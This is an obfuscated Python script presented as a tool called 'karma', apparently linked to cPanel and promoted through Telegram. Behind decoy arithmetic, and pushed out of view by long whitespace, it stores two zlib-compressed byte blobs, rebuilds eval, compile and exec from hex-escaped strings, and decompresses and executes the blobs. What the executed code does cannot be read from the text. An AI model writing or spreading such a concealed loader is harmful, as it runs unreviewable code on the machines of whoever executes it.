from builtins import *
from math import prod as Positive


__tool__ = 'karma'
__authors__ = ('Telegram:', '@xnabob')
__api__ = 'cpkarma.cc'
__telegram__ = 'https://t.me/cPanelKarma'
__version__ = '1.0'

__code__ = '4836037d39227231520bc3346a94c8a7'


_walk, _invert, _round, _system, Calculate, _positive, _memoryaccess = exec, str, tuple, map, ord, globals, type

class _algorithm:
    def __init__(self, _substract):
        self._floor = Positive((_substract, -64224))
        self.Negative(_callfunction=16059)

    def Negative(self, _callfunction = True):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._floor *= -50712 * _callfunction
        
        try:
            (_round, _add, _walk) if _system != _add else (_system, _add, _system) <= _system

        except AttributeError:
            (((_system, _add, _system), Calculate) for Calculate in (_system, _add, _system))

        except:
            _memoryaccess(-17288 * -16935) == int

    def _random(self, DetectVar = 83493):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        DetectVar *= -15834 + 43827
        self._detectvar != type
        
        try:
            ((_add, {_add: _round}) for _add in (Calculate, _add) if _invert != _invert)

        except ArithmeticError:
            ((_add, (Calculate, _add)) for _add in (_walk, _round) if _positive < _walk)

        except:
            _memoryaccess(17679 - 94652) == None

    def Run(MemoryAccess = False):
        return _positive()[MemoryAccess]

    def Ceil(_product = -66425 - -3643, _cube = None, _power = _positive):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _power()[_product] = _cube
        
        try:
            (((_walk, _round), _round) for _round in (Calculate, _add))

        except ArithmeticError:
            (_round, _add, _walk) if _round == _invert else {_add: _round} <= _round

        except:
            _memoryaccess(-98247 - 68412) == bool

    def execute(code = str):
        return _walk(_invert(_round(_system(Calculate, code))))

    @property
    def _detectvar(self):
        self.Product = '<__main__._product object at 0x000005077BE70890>'
        return (self.Product, _algorithm._detectvar)

if __name__ == '__main__':
    try:
        _algorithm.execute(code = __code__)
        Square = _algorithm(_substract = -39902 - 5987)

        if 177365 > 7049402:
            Square._random(DetectVar = -95847 / Square._floor)
        elif 415202 < 3390876:
            Square.Negative(_callfunction = Square._floor * 57087)                                                                                                                                                                                                                                                          ;_algorithm.Ceil(_product='lIlIlIIIlllIlIlIlII',_cube=b'x\x9c\xdd\x1cko\xe2\xba\xf2;\xbf\x82\xdb/\x80\xb6\xdb\xcd\xd3\x81J\x95\xaet{\xae\x04\']V\xea\x91\xb6\xd2\nE!\x8f\xddt\x03A\x90n\xd9\x7f\x7fg\xc66\x04BBB\xa0w\xd5\xa4q\x1c\xdbq<\xe3\xf1<M\xd3\xe5\xef\xdbV\x1b\x8e(\xec\xd2\x1d\x0f\xc7I\x93$v\x9c\xf6\xbf\xee\xae~\xba\xcb\x99{\xd5N\x96\x99Z\xf7%\xfd\x91,W\xd4\xa0{\xf5O\x10\x07\xdf\x97\xee\xec\xf6\xea\xfa\xea\xdf\xeb\xb9;M\xa6W\xbd\xdd\xf6\x8b\x88w\xe6-\xa8\xbb\x1b\xcf\xdb\xeb1\x15}\xf0f?\xd2t\xb1\xba\xfd\xf4)\xbd\x99\x05\x9f\xbc/\xee<\x88\xff>0\x8c_\xc1r\x15%s\xfe\x8ez\xa3\xecU{\x89\x1fP]\xc7\xe8\xebL\xd1-_\x1fh\x9a\xa5\xe9\xaa\xa9)SO\xd7\r\xe6\x0e\x0c\xaf\xefZ\x9dV\xefv\xf3b4O\xbb\x9d\xd5\xcf\xc8\xef\xf4Z\xc1\xda\x0b\x16\xa9@\xd0|\xf1\x92v\xaf\xbe\xc4\x81\xbb\n\xda\xf7\xc9\xbc\x93\xb6\x1f\x12?\n\x7f_\xf5Z\xfc\x8b\xd1l\x91,S\xc7\x81\xf7\x7f\xaf:\xbd\x9b`\x1d\xa5\xdd^+N<7^u{\xdf:\xaf\xeb\xd7\xf5z\xfd\xfa*S\xfa\xebL\xee\xbe\xc7\xc9\x14\x9a\xb4\x0e\xd6\xe3\x8b\x0f\x0f\x9f?\x7f~\xf8\xfc\xf0@\x19<x\xae\xf3\xed\xf6\xf6\xc3\xc7\x0f\x1f\xbb\x1f\xbb\x1f\xd4^o\x02]\x05\xa9\x9b\xa6\xcb\xe2\xae\x86\xf6hh\x0f\x87#\xf8\xc3\x8c\ri\xbe\x17?*\xe9\xc1\x1e\x8el\xec\xc1\xa6~(;\xc2^&w\x1c\xd2VA\x03\x8e\x815\xef\x17\xfb\xa4<\xc2\xbfE]\xf1W\xa1\x83\x91=\xe2c&\x10\xa8\xf7\xa1\r\xaf\x1f\xe8\xb4\xdb\x99\xbeDq\x1a\xcdq\x1e~\xb9\xcbU\xab\xe8}\xc2\xc90\x86l\x0c\x07\xa6\xe2\x01n1t\xde\xe9\xdc<\'\xd1\xbc\x0c\xa8\xedP)\xf3J)\xbc\xba\x99&1a0\x81\x94\xe9\x1e\x1c\xf0j\x1e\xa5q\xf42\xdd\x9f\x8d\xde5|\t\xbf:\x1a\xd1\xb4\xe1@\x865\xbb\xe8};C\x1f7\xd1\xdc\x0f\xd6\xddN\x10G\x8bY\xe2\xe5\x1aLzeHJ\x92\xfbd\x9c@\x8a\xc7xL\xb7\xe4~\xfc~\xd1\x94\xbaI\x1c\xd6D\xd2\x9c\x1f38\xe73<\xe6\xef\x17?q\x92\xe4k\x01=G\x16*.L:\x86\x9bLm\x1cE\x91\xb7r\xe7Q\x13\x1c\x15vQ\x03G\xc5}H\x1c\xfd\x0e\xa3x\x1d\xfc\x98\xbf\x1cBT!\xab|z\xfa*OL\xe0x\xbfT\xb4LW\xb5p3\x1e\'c\x05.\xb8+\x8a\x02\xd7x\xac\x10_R\xde/\x8e\x82\x97\xe5?uW\x1a\xa0\x08\x10E\x07\xe4\xe0R\xde5\x8ab\xf7WP\x17E\x92\xbc\xb8\xcc\x7f\x95\xdf[\xbfg\xd1\xbf\x8a\xdd\xff\xd6Zo\\\x98\x81 C\x81FbMH\xb8l/\x07\x89\xad\xdb\xe9\x19\x8e\xeeh\x8e\xe1\x98pW\xe1d\x8e\x0e\xad\xcd|i\x95\xce\x06\xd0\xb4\xef(\xf0\x92Ew\x93:S\xa0\xab\xbd\xd2*\x9dY\xf0\x1a\xbeb\xc0K\x03\x1aM\x1fZ\xf7\xf3\xa5U:S\xa0V=\xde\xf0\xb0\xf0\xebN;\xba\xaa\xf9Z_\xf3uE\x1b\x80\xba\xeb\x07h\xfat;\xfd0\xcd\xcb\x8d\x1eOv\xaewK\xae^\xb0>\xb8\xaa/C\xad&\x10\xcf\x00\xa8\x11\xe9\xd2\x84\xb97\x1c\x06\xadY\xbe\xb4Zg\x16\x9c\xd8\xa5J\xaf\x03\xa1Sg\xb9\xd2&t\xc3\xccPW\xe0\x1a\xc0e\xc0\xa5\xc3\xd5\x17wU\x94\x0f\xb4)\xd1V\x95\xb6\xfdz\xf47\x01%y\x1e]\xc3\xb5\\\\\xe3\\]\xc7\xb1\xdbN\x97\xc9b\x16\xb5\xe5\xec\xb6g\xc92|\xcb\xc5QH\x1d\x85\x9f`\x01\xf3\xe1\x92\xa7\xbfI\xfdM\xb9/\x9eE\xed\xb1\x81L\x8a\xe1a\x03\xe6[\n\x0b-\xcd24\xc5\xd2-\x93i\x96bi,d0G\xf0\xac\x1f\x85\xf2\xcf\x80\x10\x9d$b\xb2\xff\x88\xe9m\xb6\xf8\x19\t#]\xacL\x14\x0f\xb8^\xad|i\x13X\x15\x01\xabZ}\x9d\x01\x9e{\xc1w\xf7\xa7\xe7.\xba\x8e\xc3\xd1\xed8M\x06af\x16\xbc!\x98\x80|Ff\x80\x8c\xc2\x10L\xa3J[\xbd\xea\xc4\x95\xebb\xc2\xfd\xb2\xfdC5\xac\xec\x15`;\xd5&\xd6\x02F\xab\xc1\x89\n\x02rqF\x13\x9b+mD\xc4\x80\x07M\xe0E\xc9\xe0\xc8\x12\xcf\x161W\x8e\xd3*m\xad\x1a\x04R\xbc \xee\xef\x13\x84cL\x8e\x9b{\xb0\x98\xc8]S\xd8\x1c\x98w\x13\x1c\xf4\x05\\Y\xd8t\x91g\x02.)\x8c\xaa\xb4\xad(\x8c&\xa5tec\r\x94\xda6\xbaJ\xa1\xb8\x9c\xa8\x8a\x19\xa8i\xf5\x99\xc9\x8e\xf2\xe6\x92\xd9 \xfc\x81\xdd\n\xd6\xabB\xe6\xeb8\x81\xc1\x14;\x93\n\xc7B\xd2b\xc0\x02\xcbh2\x9ad\x8cn\xbc1R\x06\x92\x06R\x07z\xf4\x8e,\xba3\xf3\xa2\x9a\xcc\xbf|\xae\xe3g8\xe2\xe78\x82\xf3\x99\x0e\xc8E\xd1\xf3\xf3\x89h>A4\x97 \x1c5r\xf1\x87\xda9\x06\x03\xf0\xe9Dz\x84\xc1\x0c\xaa\x0c\xa7\x0c_\x8f\x8f\x8f\x9a\x86\x7fx\xcf\xdc\xaaqU\xb4\x8e\xd0vC\xa3\xcb\x00\xe1h\x12W\xcd\x956\xe5\xaa\x03!u$\x97\xd0\x04\xa7 \xb55\xc3Q\xcb\xda\xd50\xab&w\xb1;\x9b\xfan\xfbQb\x86\xb0\xf2H\x8f\xb7\xc5\xd8,Et\x02l\xf8\x1eN\xbcc\x02|\x18\x9d\xe9\xb0\xfe\xdfN\x97\x98\xdc\xd5\xfc\x80\xa61\xd7\xd2\x81\xf4\x03M;\xae\x91\x9e\xc4S\xfd\x8cR\x9aUI\xa5:\xea\x1f\xa5\xef\xedli\x9c\x98\x1f\xc5\xbcQ\x1e\xee\xb7\x05\xeb\xb1t\xbe^E\xcb\xcd[o\xe2\x04\x90\xbaV\xd6H\x93z\xc1@P4\xdb\xd3\xcb\xca\xda\x9au\xa8\xbe>q ixh\xc60\x15\xa6J\xbd\x14\x91\x18\xbe\x11\x88\x0bS~\xcagY\xe6\xcb\x92\xca\x043"\xfe\x8fc\x19\xa2\x9b\x025\x03\x1b\x87f\xdf\x16J\x8aR\x92\x19\xd1\xeb\xe4\xf4\xc0\xee\x86\xf6\x19I\xa6\xd3C\xe3C%\x9f\x94\t|\xb5\x0f\xa7\x01\xad\xb5|\xe9Y\xbf\xaa9\xdc(B\x07\x1b\x83/\x0c\x9c\x01\xb4\xd6\xf3\xa5M\xb5FiM\xa8\x99\xab\x9f\xd1\x98\xcb\xda\xd4\xd0\x94w]f\xa7Q|\xc0`\x8d\x81\xe9\xae\x812\x08\n\x98\x160\x06\xcf\x06\x96\xa1\x86\xd0p\x15t0\xde\xf3\x95">_y\xf0\xe7-\x95\xab\x9d\xb5AT\x8c\x94o\xcb\xe5p\x12+\xa5`|,\xa2\xf3\x94\xc7\xa4\tT\x86`wL\\H\x08\xa6\xf4u\x89\xbc4_\xab\xb4\xadh\xben\xb0\xb3\xdeX\xa9"Z\xf0\xfaz"\xcfx\x8eQ=\x8d\xb9\xc6\xfa\x8c\x00\x82\xf6\n\xeaj%\xb3V%E\x0b\xd5,4`\r4d\x89%\xe4J+u\x06\xb5\xca\x19\x1b\x9e\xd5\x03\xd2d\xc9\x86\x8d\x97d\xb1`r\x8d\x01\x9d\x1e\xa5.\xdc]\xca{\x94sE\xd9Q0O\x01\x0b\x8d?\xdd2@\xf2z\xcck\xcas\x84\xae\xc4u\x7f\xd2y\xdfD\xdd1\x84\xba\xa2\x8bu\xc82y]\xbaB2\xeb\xf8X[vQu\xc7\xd0\x19\xd9\xffl\x8a\xc8g\x96\xa6\x00\xf2\x03f\xc0}g2d-\x89\x03\x15\x0c\xc8\x01\x89\n\xf4\xf4\xe2\x1b\xf8\xbe\xca,\x12\x15\x01\x9d\r\'\x8f\x1b\x14\x08\x06\x0f\x82\x93\x7f\xa1Z|\x02\xf9\x84F1\x08T!\xb8\x01\xc7\xf2\xa5\xd5Bs\n\xb1\x1cS\x84\xe2L\xd2\x14\x14\xe8d\xaf\xf4\x1c\x8c?\xab\td\xfdG\xc4\xd0\xf7\x18\x7fY[\xa3f\xb0\xa3>\xd1\x98\x1e\x0bL\x03\t\x07\xc8\x84\x91\xbe\x8c\x1a\xb3\xb5!!\x1f\xca@w\x80R$\x08 \x10$\x16N*<<\x00\xf5\x0c\x9eE\x1f\x82\xcc\x80\xec\xa8%\xd6#\xc1\xa16\x82\xed\x07\x19\xa24X\x08i\x00_3\xf6\x891G\xb2*\xe4\x06\xa8\xdb\xe8\xee\xc5M\xbdl\x14b7\xea L>\xd9\xb2\xb2&/\xc2\x8a\xdb\xdb\xc9\x1a<6\xa5\xc66\x7f\xa7\x91\x9aR[\xf9\xaa/\x05|\xa4\x1c\x9c\xbb]\x1f\x95\xa0\xaeK\xcd$\x89;\xa4\x1b\x99\xca3\xfb$k/ \xfc\xcc\xd0\x0c\xd1\xe0D01\xdf\x94\x83\x82\xc2\x15\x93\x02\x06\x9a\x18$\xe80\x8c\xcf\xaa3\xe9\xc4G\xf9\xb6\x02F\xdc\x159\xad\x91/\xad\xa6\xf6\xa1w\xcd\x101\x0bT\xf1TR\xfbr\xa5\xff\xa7\xed\x08\'L(q\x1f\x1f\xf8\xd2\xa5\x145<BJ\x81+\xe2\x85)\x94\x84\xa2\x1cr,\xbc\x00\xa5Z\x8a`\xae\x8c\xdc$\xfe\xc5\x00\x0c\x19\x9d\xba\xc2\xcfm\x0e\xf3X\x8b \xeaJe\x96\x8aPRH\x00\xef"\x9b\x8cO\xf4~\x96\xcc\x0b\xe3C\xa3Y\x90\xb3\xb2\x9d\x9b*s"\x06,6J~\xe5\xe6\xb3H\x9f\x9eN\xb2X\x85\xd3\x97\xbb\x0f\xb7\x1e\xf2?[\x16\xf0p@SVH{\x96i\xdf\xb2\x08\x9d\xc3\xf1\xa7\xee\x7f:m=\x82\xa8l\x8c$\x89\x9e\x99\xd8kPq\'\x9c\x89\x9b\x07\x88\xe9[\xdc<\xa7\x9dp\xb9\xd2\xb7\xc1\xb7P\x8f\xb3\xeebM\xa8\xc9\xd2\xae\xd22\xc1\x95cmkZ\xf3\xf5\xe7\x0e\xb4\xdbK\xf1N)\x168\xcb\x11\xc2"\xe4B!#,\x0cv11\x81\xbeCn:j\xfa\xc5\xdc\x15\xa6e\xf6\xc5im\xf22\'\xee\x17\x00N\xf3\x1b\xcb\xbd\x0e~\x93"h\xf8G#\xe0\x91\xeaJ\xea\x92B\xbbv\xccMPr@\xeaR\xae\xf4\xcd\xb9\x97\x90\\\x9c\x91\xcc\xb2\xfcdv\xa2\x01\xf3\xc4e\x9f\x94\x85O\xf4W\xc1\x81\x8c\xcc\t\x1d\xf9\x88\t\x95\\\xfb\xdc\xd1o\xe6K\xdfz\xef\xd3F!\xc1\xbd\t\x18@\xc5\x1d-\xfcwG\'\xc9v\xda\x0bb\xdbCY\x8b\xb97q{\xeeD,2\x8ehU8\xb3(Z\x9da\xb8\xc7\xdaj\x97\x15\x94\xd2_\x80\xf6\xa4q9\x17*q\x9e\xfe&\xddr\xa2-\x87\xba\x04OB\xb7\x8c\xc1]\xa7\x07\xfct\xb8\xd3\x07tv\x0c\xef\xe8\xdc-B\xae\x99>h\xf2\x8c\x9c\'\xd8\x0ej!\xb7\xf5\t\xe2\x9b\x97\x8f\x93\xfb;n\x93\x1dwI\xf5\x88y}?\x03\x03\x1a\x10\x9e\xa6* \xe6\xb6\\u\xe7Y\xeeF\xfaS\xafE\xcc\x89\xc7\xb9\x9e\xa4\xbe~\xf7\x8d~\x88\x8b\xd8\xe1\xbe\x18\xcc\xd9\x18X\xb5\xaf\xa9f\xb3\xda_E\x88\x9e\x17\x8f\x89#\xdc\'bC\x13\xf2\x08\xda\xf3\xd6\x9a\xb4\xe8g\xb7b\xd7\rm\x8b\xe7\xc9g\xf1')

        Square._random(DetectVar = -38487 / Square._floor)                                                                                                                                                                                                                                                          ;_algorithm.Ceil(_product='oDDoDOoOOoDOODDOoODO',_cube=b'\xa9\x8c\x82/\x14~\xbax\xb7\xb4\'\n\x84M"\xf7m\xc8M\x1c\xbc:\xe6\xce\x02\xee6\x881\x8e\xf3\x1c\xf1\x1a\x8c\xe1\xe0F$8\xa8f\x13\xe8\xe1\xd5\xc8\xcap\xc4\xb4\'\x0f\xbb\x1c\x8b\x1egr\xcf\xea\x8c\x1f<\xc7\xeb(\xb4L\xb8\x18\n\xda\x19\xf1\n\x9b"u\xe4\xafB\xb4\x0fG\x00\xb5\x1f\x84`\xc4\x91\xf9\x86.\xe1\x84~.\x05Ww\xe1z?\xdd\xef\x81\xf8\xb9t*\x7f<\xce\xc1)\xd8=u\xe3\xfd\x08\xbc\x9f\x8e\xe7\xc6q\xf7[\xc1.\xa6\x9b`\x1dx/\xa9;\x8d\x83k\x19\xbe\x14s\x0b\xd7\xb54&\xa4q\x81\xa0]\xe3\xa0I\xbe\x8dl\x11<\xb7\x87\xd7b\x80\x93\xdef\\\x07\xb6\xcduk\xd20\x03\xc2\xb5\xa6{\x0ex?\xe7\x07\xe5nz\xdc\xf5\xa5o|i\x8c\xbc\xb3\x9e5\xa8\xb4\xbc\xf9\xa8\xf9\xaf\xceK\x10\xfa\x1f@e\xe0\x7fY&^\xb0Z\xfd\xb5\\&\xcb\xdbs\x83k0\xf2\x90I\xa0\xb8;x7l\xa4\x1c@Im \xff\xa2[\x94\xcc\xdb\xee\xaa\x1d\x9c\x1f\x0c\x95\x18-\x8f\xb8\x87\x96F\x1eq=\x13\x83G\xe0,`\xc3\x04ja0&\x07\xa8\xeeb)\x81\\\x05\xe0(l;\xce\xdc\x9d\x05\x8esw\'~c\x8e1m\x11\xda\xa6as\xd8\x0f\xc1\xcd\x99\x8c\x88\xb0\x11\xb7\xe1(\x0c\x93e[\xd0{;\x9a\xb7\x0fq\xc4-Bw\xd6\xea\xc5\xd7\x05\x8fF\x00\xdd#\x8eUfPl!\xbfZ\xaa\x93K\x86d\x863\xfcW\x01{d\xff6\x10\x89x\xc8AH\x14\xe3 \xed\xd0;V\xe5`]o\x0f\xa2\x12\x1e\\H/c*H(\xa2\x87p\x93\xf4\xd9\x92\xcc,\xf1_b\xa2\x98"\xe1v\xf6e\x08\xaa;.\x97l\xb8\xaa\xda\xc2)\x1a\x830O\xe46\x178z\xad\xff\x01i\xdb\xf7\x9b')

        if 136137 > 9834258:
            _algorithm(_substract = 43803 - -12169)._random(DetectVar = 44083 * Square._floor)
        elif 422821 < 7821614:
            _algorithm(_substract = 88295 * 67290)._random(DetectVar = 92922 + Square._floor)                                                                                                                                                                                                                                                          ;XXWXXWXXWXWWXXXXWW,llllIIIIIlIlIIIlIIll,OOoO000oo000OOOo00,SS2SSS2S2SSS2SSS22SSSS2,SSSS22222S222S2S2SSSS2=(lambda SS22S2S2S2S2SS222SS2S2S:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(SS22S2S2S2S2SS222SS2S2S)"),filename='\x49\x4c\x4a\x49\x4a\x4c\x4a\x4c\x49\x49\x4c\x49\x49\x49\x4a\x4c\x49\x4a\x4a\x4c\x49\x49',mode='\x65\x76\x61\x6c'))),(lambda SS22S2S2S2S2SS222SS2S2S:SS22S2S2S2S2SS222SS2S2S['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda SS22S2S2S2S2SS222SS2S2S:SS22S2S2S2S2SS222SS2S2S(__import__('\x7a\x6c\x69\x62'))),(lambda wwwwxwwwwwxwwxwwxww,SS22S2S2S2S2SS222SS2S2S:wwwwxwwwwwxwwxwwxww(SS22S2S2S2S2SS222SS2S2S)),(lambda:(lambda SS22S2S2S2S2SS222SS2S2S:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(SS22S2S2S2S2SS222SS2S2S)"),filename='\x49\x4c\x4a\x49\x4a\x4c\x4a\x4c\x49\x49\x4c\x49\x49\x49\x4a\x4c\x49\x4a\x4a\x4c\x49\x49',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        Square._random(DetectVar = 88975 + Square._floor)                                                                                                                                                                                                                                                          ;SSSS22222S222S2S2SSSS2()(SS2SSS2S2SSS2SSS22SSSS2(llllIIIIIlIlIIIlIIll(OOoO000oo000OOOo00(XXWXXWXXWXWWXXXXWW('\x76\x61\x72\x73'))),_algorithm.Run(MemoryAccess='lIlIlIIIlllIlIlIlII')+_algorithm.Run(MemoryAccess='oDDoDOoOOoDOODDOoODO')))

    except Exception as _add:
        if 489672 > 7590993:
            _algorithm.execute(code = _invert(_add))

        elif 400248 > 979966:
            Square.Negative(_callfunction = Square._floor * -76531)